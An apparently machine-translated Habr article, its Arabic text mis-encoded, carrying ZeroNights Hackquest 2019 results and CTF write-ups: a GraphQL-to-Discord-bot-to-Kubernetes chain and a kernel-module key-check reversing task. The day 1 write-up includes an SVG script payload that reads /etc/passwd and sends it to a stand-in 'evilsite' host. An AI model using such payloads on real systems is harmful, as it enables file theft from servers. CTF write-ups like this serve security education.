<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>โ๐ฝ ๐จ๐พโ๐ โ๐ฝ ZeroNights Hackquest 2019. ุงููุชุงุฆุฌ ูุงููุชุงุจุฉ ๐ญ ๐จโ๐ฆโ๐ฆ ๐ผ๐ผ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ูู ุงูุขููุฉ ุงูุฃุฎูุฑุฉ ุ ุงูุชูู HackQuest ุงูุณููู ุ ุงูููุฑุณ ููุคุชูุฑ ZeroNights. ููุง ูู ุงูุณููุงุช ุงูุณุงุจูุฉ ุ ูุงู ุนูู ุงููุดุงุฑููู ุญู 7 ููุงู ูุฎุชููุฉ - ูุงุญุฏุฉ ูููู ุงูุจุญุซ....">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>ZeroNights Hackquest 2019. ุงููุชุงุฆุฌ ูุงููุชุงุจุฉ</h1><div class="post__body post__body_full" style=";text-align:right;direction:rtl"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/472416/" style=";text-align:right;direction:rtl"><p style=";text-align:right;direction:rtl"> ูู ุงูุขููุฉ ุงูุฃุฎูุฑุฉ ุ ุงูุชูู HackQuest ุงูุณููู ุ ุงูููุฑุณ ููุคุชูุฑ ZeroNights.  ููุง ูู ุงูุณููุงุช ุงูุณุงุจูุฉ ุ ูุงู ุนูู ุงููุดุงุฑููู ุญู 7 ููุงู ูุฎุชููุฉ - ูุงุญุฏุฉ ูููู ุงูุจุญุซ.  ุงูููุงู ุ ููุง ูู ุงูุญุงู ุฏุงุฆููุง ุ ุณุงุนุฏุช ูู ุฅุนุฏุงุฏ ุดุฑูุงุก ูุฌุชูุนูุง.  ููููู ูุนุฑูุฉ ููู ุชู ุญู ุงูููุงู ุ ููู ุฃุตุจุญ ุงููุงุฆุฒ ุจุงููุฑุตูุฉ ูุฐู ุงููุฑุฉ ุ ุชุญุช ุงููุตุงุตุฉ. </p><br><img src="https://habrastorage.org/webt/fg/tn/kk/fgtnkkl6yedcvzkmsnb_koppplo.jpeg" alt="ุตูุฑุฉ"><br><a name="habracut"></a><br><h2 style=";text-align:right;direction:rtl">  ุงูููู 1. ุฃุนูู ุณุฑูุฉ </h2><br><div class="scrollable-table" style=";text-align:right;direction:rtl"><table style=";text-align:right;direction:rtl"><tbody><tr><td colspan="3" align="center">  ุงููุงุฆุฒูู </td></tr><tr><td align="center">  <b>1st ููุงู</b> </td><td align="center">  <b>ุงููุฑูุฒ ุงูุซุงูู</b> </td></tr><tr><td align="center">  vladvis </td><td align="center">  gotdaswag </td></tr></tbody></table></div><br><p style=";text-align:right;direction:rtl">  ุชู ุฅุนุฏุงุฏ ุฃูู ูููุฉ ููุฐุง ุงูุนุงู ูู ูุจู ูุฑูู ุชุฏููู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงูุฃูู ุงูุฑููู</a> .  ูุญููุง ุ ูุงู ุนูู ุงููุดุงุฑููู ุงูุงูุชูุงู ุนุจุฑ ุซูุงุซ ูุฑุงุญู: ุงููุตูู ุฅูู ูุญุชููุงุช ุงูุฏุฑุฏุดุฉ ุงูุฏุงุฎููุฉ ูุจูุงุจุฉ ุงููุนุจุฉ ุ ูุงุณุชุบูุงู ุงูุซุบุฑุฉ ุงูุฃูููุฉ ูู Discord bot ุ ูุงุณุชุฎุฏุงู ุฅุนุฏุงุฏ ุงูุญููู ุบูุฑ ุงูุตุญูุญ ูู ูุธุงู Kubernetes. </p><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุฑุงุฑ ูููุฉ ุงูููู ุงูุฃูู (ููุงุฏููุฒ)</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><h2 style=";text-align:right;direction:rtl">  ุงูุฎุทูุฉ ุงูุฃููู: graphql </h2><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ูู ุงูุจุฏุงูุฉ ุ ูุตููุง ุฅูู ุชุทุจูู ููุจ ุจุงุณุชุฎุฏุงู ูุนุจุฉ ูู ูุฆุฉ js ููุนููุงุก ูุชูููููู. <br><img src="https://habrastorage.org/getpro/habr/post_images/9cf/5f7/9b1/9cf5f79b1b46572ab7a9672cd2aab2b1.png"></li><li style=";text-align:right;direction:rtl">  ุจุงูุฅุถุงูุฉ ุฅูู ุงูุงุณุชุงุชูู ุ ูุชู ุชูุฏูู ุทูุจ ูุงุญุฏ ููุท ูููุงุฌูุฉ ุงูุฎูููุฉ: <br><img src="https://habrastorage.org/getpro/habr/post_images/751/d40/d27/751d40d27d15215ce845b84c9a9a9c06.png"></li><li style=";text-align:right;direction:rtl">  ููููู ุงูุญุตูู ุนูู ูุงุฆูุฉ ุจุฌููุน ุงูุฃููุงุน ูุญููููุง ูู ุฎูุงู ุงูุงุณุชุนูุงู ุงูุชุงูู: <br><pre style=";text-align:right;direction:rtl"><code class="plaintext hljs">{ __schema { types { name fields { name } } } }</code> </pre> </li><li style=";text-align:right;direction:rtl">  ูุฑู ุญูู ุงูุชุนููู ุ ุงุทูุจู ูู ุงูุทูุจ ุงูุฃููู ูุงุญุตู ุนูู ุฑุงุจุท ุฅูู ุงูุฎุทูุฉ ุงูุชุงููุฉ. </li></ul><br><h2 style=";text-align:right;direction:rtl">  ุงูุฎุทูุฉ ุงูุซุงููุฉ: Discord bot </h2><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ููุชูู ุงูุฑูุจูุช ุจูุง ุนูู ุงูุฎุงุฏู ูููุดุฆ ููุงุฉ ูููุตูุฉ ููุง <br><img src="https://habrastorage.org/getpro/habr/post_images/956/219/d71/956219d717f189f25cc3a61c749a8c18.png"></li><li style=";text-align:right;direction:rtl">  ุนูู ุงูููุฑ ูุฑู ุชูููุญูุง ูู SSRF ูู gitea ุ ููููู ูู ุฃุตู ุฅูู ุฐูู ูุทูููุง () </li><li style=";text-align:right;direction:rtl">  ูุญุงูู ูุฑุงุกุฉ ุงูููู ุงููุญูู: <br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">&lt;svg width="10cm" height="3cm" viewBox="0 0 1000 300" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt; &lt;script type="text/javascript"&gt; for (var i=0; trefs[i]; i++) { var xhr = new XMLHttpRequest(); xhr.open("GET","/etc/passwd",false); xhr.send(""); var xhr2 = new XMLHttpRequest(); xhr2.open("GET", "http://evilsite/?p="+btoa(xhr.responseText),false); xhr2.send(""); } &lt;/script&gt; &lt;/svg&gt;</code> </pre> </li><li style=";text-align:right;direction:rtl">  ูุญุตู ุนูู / etc / passwd ููุฑู ูุณุชุฎุฏููู ุงุซููู: ุนุงูู ุ ูุชู ุชูุฏูู svg ู gitea ููุงุจุฉ ุนูู <br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">worker:x:1000:1000::/home/worker:/bin/sh gitea:x:1001:1001::/home/gitea:/bin/sh</code> </pre> </li><li style=";text-align:right;direction:rtl">  ุฐูุจุช ูุฐู ุงูุฎุทูุฉ ุนุจุฑ ูุณุงุฑ ุบูุฑ ููุตูุฏ: ูู .bash_history ุ ูุงู ูุฏู ุงูุนุงูู ูุณุงุฑุงุช ุฅูู ููุชุงุญ ssh ูุนููุงู ุงูุฎุงุฏู ุฅูู ุงููุฑุญูุฉ ุงูุชุงููุฉ <br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">cd nano .ssh/connect_info echo &gt; .bash_history exit cd cd .ssh/ chmod 755 id_rsa ls -al cat id_rsa exit</code> </pre> <br><h2 style=";text-align:right;direction:rtl">  ุงูุฎุทูุฉ ุงูุซุงูุซุฉ: kubernetes </h2></li><li style=";text-align:right;direction:rtl">  ูุจุฏู ุฃููู ูุตูุช ุฅูู ูุฐู ุงููุฑุญูุฉ ุฃููุงู.  .bash_history ู ps ูุงุฑุบุงู ุ ููู ูุฐุง ุงุณุชูุชุฌุช ุฃูู ููู ุจูุฆุฉ ุงูููููุฉ ุงูููุฑูุฉ ูุชู ุฅูุดุงุก ุจูุฆุฉ ูุนุฒููุฉ <br><img src="https://habrastorage.org/getpro/habr/post_images/225/584/a43/225584a43fca0887057424b64a1ee1b4.jpg"></li><li style=";text-align:right;direction:rtl">  ุชู ุงูุนุซูุฑ ุนูู ุฑูุฒ ู kubernetes ูู ุฌุจู <br><img src="https://habrastorage.org/getpro/habr/post_images/4d5/d0b/87e/4d5d0b87ed9b52c107a3d536cfb07f08.png"></li><li style=";text-align:right;direction:rtl">  ูู ุงูุจุฏุงูุฉ ุ ูู ููู ูู ุงููุงุถุญ ุฃูู ูููููู ุงูุญุตูู ุนูู ุงูุฑูุฒ ุงููููุฒ ุ ูุจุฏุฃุช ูู ูุญุต ุงูุดุจูุฉ ... ููู ูุฑุญูุฉ ูุง ุจุฏุฃุช ุฃุณูุฑ ูู ุงูุฌูุฑุงู ูู ุงูุณุญุงุจุฉ </li><li style=";text-align:right;direction:rtl">  ุจุนุฏ ุฐูู ุ ุชู ุฅุตุฏุงุฑ ุชูููุญ ุญูู ุงูุดุจูุงุช ุงููุฑุนูุฉ ุงูุชู ุชู ูุณุญูุง ุ ูุชู ุงูุนุซูุฑ ุนูู ุจููุฉ api kubernetes ุนูู ุงูููุฑ ุชูุฑูุจูุง </li><li style=";text-align:right;direction:rtl">  ูู ูุฐู ุงููุฑุญูุฉ ุ ุฃุฏุฑูุช ุฃููู ูุณุช ูุญุฏู ุนูู ุงูุฎุงุฏู ุ ููู ุชูู ููุงู ุฑุบุจุฉ ูู ูุต ุดูุก ูุง ุ ุนูู ุณุจูู ุงููุซุงู ุ ุฅุฎูุงุก ููุงุน cmdline ุ ูุฐูู ูุฑุฑุช ุฃู ุฃูุนู ุฐูู <del>  ุฃุณูู </del>  ุฃููุง ุฃูุซุฑ ุฅููุงูุง ูุชูุชูู ุฅูู ููุณูุง ุงูุฌูุงุฑุจ ูููู ูู ุฎูุงู ุณู </li><li style=";text-align:right;direction:rtl">  ุจุงุณุชุฎุฏุงู <code>kubectl get pods</code> ุ ุชู ุงูุญุตูู ุนูู ูุงุฆูุฉ ุงูุญุงููุงุช ุ ูุงูุชุฑุญ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ูุซุงุฆู kubernetes</a> ุฃู exec ูููู ุงุณุชุฎุฏุงููุง ูุน ุจูุงุก ุงูุฌููุฉ ููุณู ููุง ุนุงูู ูููุงุก </li><li style=";text-align:right;direction:rtl">  ุซู ูุงู ููุงู 1.5 ุณุงุนุฉ ูู ุงููุนุงูุงุฉ ูุน ูููู ุงูุฌูุงุฑุจ ุ ูุงูุชู ูู ุฎูุงููุง ูู ูุฑุชูุน websocket ู exec.  ุงูุชูู ุจู ุงูุญุงู ุงูุฐูุงุจ ูุจุงุดุฑุฉ ุฅูู kubectl ุนุจุฑ ุณู <br><img src="https://habrastorage.org/getpro/habr/post_images/f49/096/be8/f49096be8b3c769802f612325f70e7ba.png"></li><li style=";text-align:right;direction:rtl">  ุชุญุชูู ุงูุญุงููุฉ ุงูุซุงููุฉ ุนูู ุฑูุฒ ุฌุฏูุฏ ูุชูุชูู ุจุงููุนู ุงููุตูู ุฅูู ุงููุชูุฉ ูู ูุณุงุญุฉ ุงูุงุณู ุงููุฌุงูุฑุฉ zn2 (ูู ุงูุจุฏุงูุฉ ูุญู ูู ูุณุงุญุฉ ุงูุงุณู zn1) ุ ุญูุซ ูุงู redis ูุฑุฆููุง </li><li style=";text-align:right;direction:rtl">  ูุฐูุฑ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงูุชูุฑูุฑ</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">paulaxe</a> ูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Zeronights</a> ุงููุงุถูุฉ ูุงูุญุตูู ุนูู RCE ุ ุนูู ุณุจูู ุงููุซุงู ุ ุจุงุณุชุฎุฏุงู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">PoC</a> </li><li style=";text-align:right;direction:rtl">  ุจุนุฏ ุชููู ุงูุฑูุฒ ุงููููุฒ ุงูุชุงูู ุ ููููู ุณุญุจ ุงูุนูู ูู ุฃุณุฑุงุฑ kubernetes <br><img src="https://habrastorage.org/getpro/habr/post_images/71e/49d/172/71e49d172f647b8311233e5646dd9170.png"></li></ul></div></div><br><h2 style=";text-align:right;direction:rtl">  ููู 2. MICOSOFT LUNIX </h2><br><div class="scrollable-table" style=";text-align:right;direction:rtl"><table style=";text-align:right;direction:rtl"><tbody><tr><td colspan="3" align="center">  ุงููุงุฆุฒูู </td></tr><tr><td align="center">  <b>1st ููุงู</b> </td><td align="center">  <b>ุงููุฑูุฒ ุงูุซุงูู</b> </td><td align="center">  <b>ุงููุฑูุฒ ุงูุซุงูุซ</b> </td></tr><tr><td align="center">  ููุฒู </td><td align="center">  Sin__ </td><td align="center">  AV1ct0r </td></tr><tr><td colspan="3" align="center">  ูุฑุฑ ุฃูุถูุง: demidov_al ุ gotdaswag ุ medidrdrider ุ groke_is_love_groke_is_life </td></tr></tbody></table></div><br><p style=";text-align:right;direction:rtl">  ุชู ุฅุนุฏุงุฏ ูููุฉ ุงูููู ุงูุซุงูู ูู ูุจู ุฃุนุถุงุก ูุฌุชูุน <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">R0 Crew</a> .  ูุญู ูุฐู ุงููุดููุฉ ุ ุชุญุชุงุฌ ุฅูู ุฅูุดุงุก ููุชุงุญ ุชูุดูุท ูุตูุฑุฉ Linux ุจุงุณุชุฎุฏุงู ููุงุฉ ูุนุฏูุฉ. </p><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุฑุงุฑ ูููุฉ ุงูููู ุงูุซุงูู (ููุฒูุฉ)</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><p style=";text-align:right;direction:rtl">  ุงูููุฏูุฉ: ููู <code>jD74nd8_task2.iso</code> ุ ุตูุฑุฉ ISO ูุงุจูุฉ ููุชุดุบูู.  ูู ุงููููุงุช ุงูููุฌูุฏุฉ ุฏุงุฎู ุงูุตูุฑุฉ ุ ูููููุง ุฃู ููุชุฑุถ ุฃูู Linux: ููุฌุฏ <code>boot/kernel.xz</code> kernel <code>boot/kernel.xz</code> ุ <code>boot/rootfs.xz</code> ramdisk <code>boot/rootfs.xz</code> ุงูุฃููู <code>boot/rootfs.xz</code> ุงูุชูููุฏ <code>boot/syslinux/</code> . </p><br><p style=";text-align:right;direction:rtl">  ูุญู ูุญุงูู ูู ุฌููุฑ ู ramdisk.  Ramdisk ููุง ูู ุฃุฑุดูู cpio ููุชุธู ูุถุบูุท ุจูุงุณุทุฉ xz.  ูู ุญุฒูุฉ ุงูููุงุฉ ุจุงุณุชุฎุฏุงู ุงูุจุฑูุงูุฌ ุงููุตู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux</a> .  ููููู ุฃูุถูุง ุงูุงูุชุจุงู ุฅูู ูุนูููุงุช kernel: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">&gt; file kernel.xz kernel.xz: Linux kernel x86 boot executable bzImage, version 5.0.11 (billy@micosoft.com) #1 SMP Sat Aug 25 13:37:00 CEST 2019, RO-rootFS, swap_dev 0x2, Normal VGA</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุนูู ุทูู ุงูุทุฑูู ุ ูุฌุฏ ูู ุงูุตูุฑุฉ iso ุงููููุฉ ุงูุฃุณุงุณูุฉ ูู <code>minimal/rootfs/bin/activator</code> : ูู โโุฐูู ูุนูุฏ ููุชุงุจุฉ ุจูุงูุงุช ุงูุจุฑูุฏ ุงูุฅููุชุฑููู ุงููุฏุฎูุฉ ูููุชุงุญ ุงูุชูุดูุท ููุฌูุงุฒ <code>/dev/activate</code> ุจุงูุชูุณูู <code>$email|$key</code> .  ูู ุญุงูุฉ ุฅุฌุฑุงุก ูุญุต ููุชุงุญ ูุงุฌุญ ุ ุณุชุคุฏู ุงููุฑุงุกุฉ ูู <code>/dev/activate</code> ุฅูู ุฅูุชุงุฌ ุฎุท <code>ACTIVATED</code> ุ ูุณูุจุฏุฃ ุงูููุดุท ูู ูุฐู ุงูุญุงูุฉ ุจุงููุนุจุฉ 2048. </p><br><p style=";text-align:right;direction:rtl">  ููุฏ ุญุงู ุงูููุช ูููุธุฑ ูู ุงููููุฉ ูู ุงูุฏููุงููุงุช.  ููููุงู ุจุฐูู ุ ูู ุจุชุดุบูู ุงููุญุงูู ูู KVM: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">&gt; qemu-system-x86_64 -enable-kvm -drive format=raw,media=cdrom,readonly,file=jD74nd8_task2.iso</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุจุฏุฃ Linux ููููู ููุฑุงู ุจุชุดุบูู <code>/bin/activator</code> ูู ุงูุชุฑุงูุจ.  ูุฐุง ูู ููุชูุจุฉ ูู <code>/etc/inittab</code> .  ูุชุฌูุจ ุงูุญูุฑ ูู ุงูุซูุงุฆูุงุช ููุชุฑุฉ ุทูููุฉ ุ ุฃุฑุฏุช ุงูุญุตูู ุนูู ุตุฏูุฉ ูุฅููุงุก ูุธุฑุฉ ุนูู <code>/proc</code> ู <code>/sys</code> ุนูู ุงูุฃูู.  ุฃุณูู ุทุฑููุฉ ุจุงููุณุจุฉ ูู ูู ุจุจุณุงุทุฉ ุชุญููู ููู iso ุฅูู ุงูููุงู ุงูุฐู ููุฌุฏ ุจู ุงูุจุฑูุงูุฌ ุงููุตู ุงูููุดุท ููุณู.  ุจุฏููุง ูู ูุฌููุนุฉ <code>sleep 1</code> <code>/bin/sh</code> ุ ุฃู  ุชูููุช ูุฐููุฉ ุจุนุฏ ูู ูุญุงููุฉ ูุฅุฏุฎุงู ูุณูุณู. </p><br><p style=";text-align:right;direction:rtl">  ุฅุฐู ููุงู ูุฐููุฉ: ูุจุฏู ุฃู <code>/proc/kallsyms</code> ุบุงุฆุจุฉ ุ ุฃู  ุดุฎุตูุงุช ููุงุฉ ููููุฏุฉ.  ูุนูู ุ ุจุงูุทุจุน ุ ุณูููู ุฃุณุฑุน ุจูุซูุฑ ุ ููู ูุฐุง ุฌูุฏ.  ูุญู ูุจุญุซ ุนู ูุนูููุงุช ุญูู ุงูุฌูุงุฒ <code>/dev/activator</code> : </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">/ # ls -la /dev/activate crw------- 1 0 0 252, 0 Oct 15 08:57 /dev/activate / # cat /proc/devices Character devices: ... 252 activate ... Block devices: ...</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูู ุงููุนูููุงุช ุงูููุฌูุฏุฉ ูู <code>/proc/devices</code> ูููู ููุงุญุธุฉ ุฃู ูุฐุง ุฌูุงุฒ char ูู ุฅุตุฏุงุฑ ุฑุฆูุณู 252 ู ุซุงููู 0. </p><br><p style=";text-align:right;direction:rtl">  ููุฏ ุญุงู ุงูููุช ููุนุซูุฑ ุนูู ูุธููุฉ ุงูุชุณุฌูู ููุฐุง ุงูุฌูุงุฒ ูู binar binar ููุนุซูุฑ ุนูู ุงููุนุงูุฌ ูุนูููุฉ <code>write</code> ุงูุฎุงุตุฉ ุจู.  ููููุงู ุจุฐูู ุ ุงุจุญุซ ุนู ุฅุดุงุฑุงุช ูุฑุฌุนูุฉ ุฅูู ุงูุณูุณูุฉ <code>activate</code> .  ูููู ูุง ููุฌุฏ ูุซู ูุฐุง ุงูุฎุท ูู ุงูููุงุฉ ุ ูุฑุจูุง ูููู ูุฎูููุง ุจุทุฑููุฉ ูุง. </p><br><p style=";text-align:right;direction:rtl">  ูู ุงููุญุงููุฉ ุงูุชุงููุฉ ุ ูุญุงูู ุงูุนุซูุฑ ุนูู ุงููุธุงุฆู ุงููุณุคููุฉ ุนู ุชุณุฌูู ุฃุฌูุฒุฉ ุงูุดุฎุตูุงุช: <code>cdev_add</code> ู <code>register_chrdev</code> .  ูููู ุงูููุงู ุจุฐูู ุนู ุทุฑูู ุงููุฑุงุฌุน ุงูุชุจุงุฏููุฉ <code>/dev/console</code> ุฃู ุฃู ุฌูุงุฒ ุญุฑู ุขุฎุฑ ูุฃุฎุฐ ุดูุฑุฉ ูุตุฏุฑ kernel (ุฃุฎุฐุช ุงูุฅุตุฏุงุฑ 5.0.11 ุ ููููู ูุณุช ูุชุฃูุฏูุง ููุง ุฅุฐุง ูุงู ุงูุฅุตุฏุงุฑ ุตุญูุญูุง).  ุจุนุฏ ุงูุงุทูุงุน ุนูู ูุงุฆูุฉ ุงูุฃุฌูุฒุฉ ุงูุชู ูุชู ุชุณุฌูููุง ุ ูู ูุนุซุฑ ุนูู ุฌูุงุฒ ุจู ุฅุตุฏุงุฑ ุฑุฆูุณู 252 ุ ููู ุงููุญุชูู ุฃูุง ุชุณุฌู ูุงุชุงู ุงููุธููุชุงู. </p><br><p style=";text-align:right;direction:rtl">  ุฏุนููุง ูุญุงูู ุงูุจุญุซ ุนู ุจุนุถ ุงููุฑุงุฆู ุงูุฃุฎุฑู ูู ุงูุฏููุงููุงุช: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">/ # ls -la /sys/dev/char/252:0 lrwxrwxrwx 1 0 0 0 Oct 15 09:00 /sys/dev/char/252:0 -&gt; ../../devices/virtual/EEy????I/activate</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุฅููู <code>EEy????I</code> ุฌูุงุฒ <code>EEy????I</code>  ูุญุงูู ุงูุนุซูุฑ ุนูู ูุฐุง ุงูุฎุท ูู binar ููู ููุฌูุฏ! </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/ww/2x/pa/ww2xpaeiblwxlyive4ytkkdp4iq.png"></p><br><p style=";text-align:right;direction:rtl">  ุนูู ุงูุฑุบู ูู ุนุฏู ูุฌูุฏ ุฅุดุงุฑุงุช ูุฑุฌุนูุฉ ุฅูู ุฐูู ุ ูููู ุจุฌุงูุจู ุชูุฌุฏ ุจูุงูุงุช ูุฑุฆูุฉ ุชุดุจู ุงูุณูุงุณู.  ุฅุฐุง ูุธุฑุช ุฅูู ุงูููุฏ ุงูุฐู ูุณุชุฎุฏููุง ุ ููููู ุฃู ุชุฑู ุฃู ูุฐู ูู ูุนุงูุฌุงุช ุงููุฑุงุกุฉ ูุงููุชุงุจุฉ ุงููุทููุจุฉ ูุฌูุงุฒ <code>activate</code> ุงููุดูุฑ ุจุงุณุชุฎุฏุงู XOR ุงูุจุณูุท. </p><br><p style=";text-align:right;direction:rtl">  ูุฑุงุกุฉ ูุธููุฉ ุงููุนุงูุฌุฉ: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/wr/gj/le/wrgjlelw6zor474zwwy2eins8zw.png"></p><br><p style=";text-align:right;direction:rtl">  ูุธููุฉ ูุนุงูุฌุฉ ุนูููุฉ ุงููุชุงุจุฉ ุ ุจู ูู ุฃูุถุง ูุญุต ุงูุชุฑุฎูุต: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/go/sh/vm/goshvmqukonyiv69nltp_g9xrlw.png"></p><br><p style=";text-align:right;direction:rtl">  ุฃุธูุฑ ุงููุญุต ุงูุณุฑูุน ูุฑูุฒ ุงูุชุญูู ูู ุงูุชูุดูุท ุฃูู ูู ุงูุฃุณูู ูุถุน ููุทุฉ ุชููู ุนูู ุงูุนููุงู <code>0xFFFFFFFF811F094B</code> ูุงูุชูุงุท ุฑูุฒ ุงูุชูุดูุท ููุงู ุ ุฏูู ุงูุฎูุถ ูู ุญูููุฉ ูุง ูุญุฏุซ ููุงู.  ููููุงู ุจุฐูู ุ ูู ุจุชุดุบูู qemu ูุน ุงูุนูู <code>-s</code> .  ูู ูุฐู ุงูุญุงูุฉ ุ ูููู qemu ุจุชุดุบูู ูุนุจ gdb ุ ูุงูุฐู ูุณูุญ ูู ุจุงุณุชุฎุฏุงู ุฃู ุนููู gdb.  ุฃุณูู ูุฃุณุฑุน ุทุฑููุฉ ููููุงู ุจุฐูู ูู IDA Pro ุ ุฅุฐุง ูุงู ูุฏูู ุชุฑุฎูุต.  ูููู ูุง ุฃุญุฏ ูููุน ุงูููุงู ุจูู ุดูุก ูู ูุญุฏุฉ ุงูุชุญูู gdb. </p><br><p style=";text-align:right;direction:rtl">  ูุญู ููุนู ูู ุดูุก ููุง ูู ููุถุญ ูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงูุจุฑูุงูุฌ ุงูุชุนูููู</a> ุงูุฑุณูู.  ุฃูุช ุงูุขู ุจุญุงุฌุฉ ุฅูู ุงูุนุซูุฑ ุนูู ูุธููุฉ ุงููุนุงูุฌุฉ ุฏุงุฎู ุงูููุงุฉ ููุฏ ุงูุชุดุบูู ุจุงููุนู. </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/ql/cc/f1/qlccf1qgfqvp3mimbbuyazih4de.png"></p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/jh/ui/br/jhuibrua89zngguxpedg0oco8h8.png"></p><br><p style=";text-align:right;direction:rtl">  ููุฐ ุฃู ุชู ุชุตููู kernel ุจุฏุนู KASLR ุ ูุชู ุชุญููู ุนูุงููู kernel ููุฏ ุงูุชุดุบูู ุฅูู ุฅุฒุงุญุฉ ุนุดูุงุฆูุฉ ูุชู ุฅูุดุงุคูุง ูู ูู ูุฑุฉ ูุจุฏุฃ ูููุง kernel.  ูููู ุจุญุณุงุจ ูุฐุง ุงูุฅุฒุงุญุฉ (ูุฃุฎุฐ ุนููุงู ุชุณูุณู ุงูุจุงูุช ุงููุฑูุฏ ูู ุฑูุฒ ุงูููุงุฉ ุงููุตุญุญุฉ ููุทุฑุญ ุนููุงู ูุฐุง ุงูุชุณูุณู ูู ุงูุซูุงุฆู ููู) ุ ูุฅุถุงูุฉ ูุธููุฉ ุงูุชูุดูุท ุฅูู ุงูุนููุงู ุ ูุฌุฏูุง ูู ุงูุฐุงูุฑุฉ.  ูู ุดูุก ุ ุงูุขู ุงูุฃูุฑ ูุชุฑูู ููุตุบุงุฑ.  ุชุนููู ููุทุฉ ุชููู ูุงูุชูุงุท ุงูุฑูุฒ. </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/ef/yp/vg/efypvgwh0kyc2zi999ucriitvt8.png"></p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/nt/ny/wa/ntnywaix5hh2hptggey0gk9a8fi.png"></p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/q4/4c/tm/q44ctmpm3uzgmm_9tigzw9us4a0.png"></p></div></div><br><p style=";text-align:right;direction:rtl">  ุชู ุจุงููุนู ูุดุฑ ุญู ูุฐู ุงููููุฉ ุนูู ุงููุญูุฑ ุจูุงุณุทุฉ ุฃุญุฏ ุงููุดุงุฑููู.  ููููู ุงูุชุนุฑู ุนูููุง <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ููุง</a> . </p><br><h2 style=";text-align:right;direction:rtl">  ุงูููู 3. ููุฒู BECHED </h2><br><div class="scrollable-table" 